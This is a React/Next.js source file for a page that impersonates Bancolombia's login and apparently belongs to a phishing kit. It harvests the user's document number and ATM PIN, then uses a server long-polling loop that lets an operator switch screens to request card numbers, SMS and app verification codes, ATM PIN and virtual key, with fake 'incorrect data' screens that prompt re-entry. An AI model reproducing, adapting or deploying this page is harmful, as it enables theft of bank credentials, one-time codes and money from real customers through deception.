"use client"
import "./bancolombia.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"
import iniciarLongPolling from "@/utils/pulling"
import inicioSesionfuncion from "@/utils/inicioSesionfuncion"
import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"

const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
const text_color_principal = "text-black"
const ESTILO_BTN_PRINCIPAL = ` font-bold py-2 px-6 bg-[#fdda24] rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed`

const svg = (
    <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
    )

const btn = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#fdda24] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)


  return (
    <div className="w-full flex flex-col">
        <div
        className={`w-full pl-3 pr-3 pt-3 relative flex items-center transition-all duration-300 ${
            isFocused ? borderColSelec != "" ? `border-1 ${borderColSelec}` : borderCol : borderCol
        } ${backGraundInput} ${borderCol} ${borderColError && error ? borderColError: ""}`}
        >
        {svg &&
            svg
        }
        <input
            inputMode={modoNumerico ? "numeric" : "text"}
            name={name}
            type={ type == "password" ? mostrarPasword ? "text": "password" : type}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            onChange={(e) => handler(e)}
            className={`ml-0.5 p-1 font-semibold text-[14px] outline-none transition-all ${backGraundInput} ${
                type == "password" ? "w-[80%]" : "w-[80%]"
            }`}
            placeholder={isFocused ? placeHolder : ""}
            value={value}
            />
        <span
            className={`absolute left-2 transition-all duration-200 px-1 pointer-events-none z-10 ${
            shouldFloat
                ? `-top-1 text-[12px] p-1 ${labelColorSelect != "" ? labelColorSelect : labelColor}`
                : `top-[50%] left-10 -translate-y-1/2 text-[14px] ${labelColor}`
            }`}
        >
            {label}
        </span>
        </div>
        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const InputAnimadoClave = ({
  name,
  handler,
  value = "",
  error = false,
  errorLabel,
  label = "",
  tamInput = 4,
  labelColor = "text-black",
  labelErrorColor = "text-red-600",
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const [digits, setDigits] = useState(value.padEnd(tamInput, "").slice(0, tamInput).split(""));

  const handleChange = (index, val) => {
    if (!/^[0-9a-zA-Z]?$/.test(val)) return;

    const newDigits = [...digits];
    newDigits[index] = val;
    setDigits(newDigits);
    handler({ target: { name: name, value: newDigits.join("") } });

    // Mover al siguiente input si se ingresó algo
    if (val && index < (tamInput - 1)) {
      const nextInput = document.getElementById(`${name}-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      const prevInput = document.getElementById(`${name}-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  return (
    <div className="flex flex-col items-start w-full">
      {label && (
        <label className={`mb-1 text-[12px] font-semibold ${labelColor}`}>
          {label}
        </label>
      )}
      <div className="flex justify-between gap-2 w-full max-w-xs">
        {Array.from({ length: tamInput }).map((_, index) => (
          <input
            key={index}
            id={`${name}-${index}`}
            type="text"
            maxLength={1}
            className={`w-8 h-5 text-center border-b-2 text-xl font-semibold outline-none transition-all 
              ${isFocused ? "border-black" : "border-gray-400"} 
              ${error ? "border-red-500" : ""}`}
            value={digits[index] || ""}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
          />
        ))}
      </div>
      {error && (
        <span className={`text-[12px] mt-1.5 font-medium ${labelErrorColor}`}>
          {errorLabel}
        </span>
      )}
    </div>
  );
};




const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, errorDatos})=>{
    return(
        <div className="w-[90%] bg-white p-2 rounded-xl flex flex-col items-center">
            <img src="/assets/bancolombia/candado.svg" alt="" />
            <div className="w-[90%] flex flex-col mt-4 mb-4">
                <span className="text-[12px] text-center text-gray-800">Es la misma que usas en el cajero automático</span>
            </div>
            
            <div className="w-[50%] mt-4 flex flex-col">
                <InputAnimadoClave 
                    error={!!errorDatos.contrasenia}
                    errorLabel={errorDatos.contrasenia}
                    svg={svg}
                    labelErrorColor={"text-red-500"}
                    borderCol={"border-b-1 border-gray-300"}
                    borderColError={"border-b-1 border-b-red-500"} 
                    label={""} 
                    labelColor={"text-gray-500"}
                    modoNumerico={true}
                    tamInput={4}
                    type={"tel"} 
                    name={"contrasenia"} 
                    handler={handlerCheck} 
                    value={datosInicio.contrasenia}
                />
                <div>

                </div>
                
            </div>
            
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button onClick={()=> handlerVolver(c => !c)} className="font-bold py-2 px-6 rounded-full border border-black"> 
                    Volver
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const Usuario = ({handlerCheck, handlerContinuar, datosInicio, errorDatos}) =>{
    return(
        <div className="w-[90%] bg-white p-2 rounded-xl flex flex-col items-center">
            <div className="w-[90%] flex flex-col mt-2.5">
                <span className="text-[12px] text-center text-gray-800">el usuario es el mismo con el que ingresas a la <span className="text-black font-bold">Sucursal Virtual Personas</span></span>
            </div>
            
            <div className="w-[80%] mt-4 flex flex-col">
                <InputAnimado 
                    error={!!errorDatos.numeroDocumento}
                    errorLabel={errorDatos.numeroDocumento}
                    svg={svg}
                    labelErrorColor={"text-red-500"}
                    borderCol={"border-b-1 border-gray-300"}
                    borderColError={"border-b-1 border-b-red-500"} 
                    label={"Usuario"} 
                    labelColor={"text-gray-500"}
                    modoNumerico={true}
                    type={"tel"} 
                    name={"numeroDocumento"} 
                    handler={handlerCheck} 
                    value={datosInicio.numeroDocumento}
                />
                <div>

                </div>
                
            </div>
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button className="font-bold py-2 px-6 rounded-full border border-black"> 
                    Volver
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })
    const [btnUser, setBtnUser] = useState(false)
    const [btnClave, setBtnClave] = useState(false)

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El campo es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    
    useEffect(()=>{
        if (btnClave) {
            handlerContinuar()
        }
    }, [btnClave])
    
    const handlerCheck = (e) => {
        const { name, value } = e.target;        
        handlerInformacion(e);
        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El campo es requerido";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full flex flex-col justify-center items-center pb-4">
            <h5 className="text-[20px] font-bold mt-10">{!btnUser ? "Te damos la bienvenida": "Clave principal"}</h5>
            
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                {!btnUser &&
                    <Usuario handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnUser} />             
                }
                {
                    btnUser &&
                    <Clave handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnClave} handlerVolver={setBtnUser}/>
                }
            </div>
        </div>
    )
}





export default function Bancolombia (){
    const isMounted = useRef(true);
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState("login")
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        if (btnInicio) {
            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setInicioSesion, setTituloError, setGuardado, selectVista)
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    isMounted.current = true;

    if (guardado) {
        iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio, setTituloError);
    }
    return () => {
        isMounted.current = false;
    };
}, [guardado, reLoad]);


    return(
        <div className={`w-full flex flex-col bg-[#f7f7f7] items-center justify-center`}>
            <div className={`w-[90%] z-50 flex justify-center items-center py-3`}>
                <div className={`w-[98%] flex  gap gap-x-10`}>
                    <img src="/assets/bancolombia/header.svg" className=" ml-[25%] w-[45%] object-contain"/>
                    
                    <div className="flex justify-center items-center gap gap-x-1.5">
                        <span className="text-[15px]">Salir</span>
                        <img src={"/assets/bancolombia/exitHeader.svg"} className="w-5 object-contain" alt="" />
                    </div>
                </div>

            </div>
            
            <div className=" img min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
                {(loading) && <Loading />}
                {(!inicioSesion || selectVista === "xlogin") && (
                    <InicioSesion key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={selectVista === "xlogin" ? tituloError : ""} btnInicio={selectVista === "login-error" ? handlerloginError : handlerBtnInicio}/>
                )}
                {selectVista == "tdb" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xtdb" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "tdc" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xtdc" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "codsms" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xcodsms" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "codapp" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xcodapp" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "pincaj" && <Status key={key} uniqId={uniqId} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xpincaj" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "pinvir" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "xpinvir" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
            </div>
            
            <div className="w-full flex flex-col justify-center items-center bg-white  py-7">
                <div className="w-[90%] border-t-1 border-t-gray-300"></div>
                <img src="/assets/bancolombia/header.svg" className="w-[40%] object-contain" alt="" />
                <img src="/assets/bancolombia/foter.svg" className="w-[40%] object-contain mt-0.5" alt="" />                               
           </div>             
        </div>
    )
}